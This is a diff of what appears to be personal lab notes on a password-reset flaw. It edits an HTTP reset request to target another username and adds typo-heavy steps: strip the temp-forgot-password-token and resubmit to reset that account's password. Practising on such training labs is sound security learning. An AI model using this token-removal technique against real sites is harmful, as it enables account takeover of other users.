@@ -187,9 +187,15 @@ we have to manipulate specific parameters in the request or so to test for the b
     Te: trailers
     Connection: close
 
-    temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu&username=wiener&new-password-1=khan&new-password-2=khan
+    temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu&username=asif&new-password-1=khan&new-password-2=khan
  
+ Remove headr temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu and body temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu remove
  
+ and sand the request an request accepted 
+ 
+ ## This is Vulnerblity
+ 
+ Chnage The username like username asif to change and add khan like forget password khan account
  
  
   
